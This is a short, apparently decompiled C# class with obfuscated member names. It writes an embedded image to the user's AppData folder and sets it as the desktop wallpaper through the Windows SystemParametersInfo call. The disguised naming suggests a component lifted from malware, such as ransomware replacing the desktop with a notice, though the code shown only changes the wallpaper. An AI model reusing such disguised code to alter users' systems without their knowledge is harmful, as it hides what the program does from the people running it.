using System;
using System.Drawing;
using System.Runtime.InteropServices;

internal class MatchIndex
{
	private static uint NativeWindows = 20u;

	private static uint GetFunctionPointer = 1u;

	private static uint M_keyName = 2u;

	private static string CharUnknown;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern int SystemParametersInfo(uint uint_0, int int_0, string string_0, uint uint_1);

	public static void Get_IsAbsoluteUri()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		CharUnknown = folderPath + "\\wallpaper.png";
		((Image)TypeNameParserHelper.HasBigStrings).Save(CharUnknown);
		SystemParametersInfo(NativeWindows, 0, CharUnknown, GetFunctionPointer | M_keyName);
	}
}
